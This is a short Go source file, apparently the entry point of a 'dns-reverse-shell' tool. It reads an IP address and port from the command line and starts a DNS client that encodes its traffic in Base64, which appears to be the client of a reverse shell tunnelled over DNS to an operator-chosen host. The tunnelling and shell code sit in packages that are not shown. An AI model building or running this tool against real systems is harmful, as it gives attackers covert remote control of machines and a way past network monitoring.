package main

import (
	"dns-reverse-shell/main/encoder"
	"dns-reverse-shell/main/protocol"
	"os"
)

func main() {
	params := os.Args[1:]
	if len(params) != 2 {
		panic("usage: <ip-addr> <port>")
	}
	dnsClient := protocol.NewDNSClient(params[0]+":"+params[1], encoder.NewBase64Encoder())
	dnsClient.Start()
}
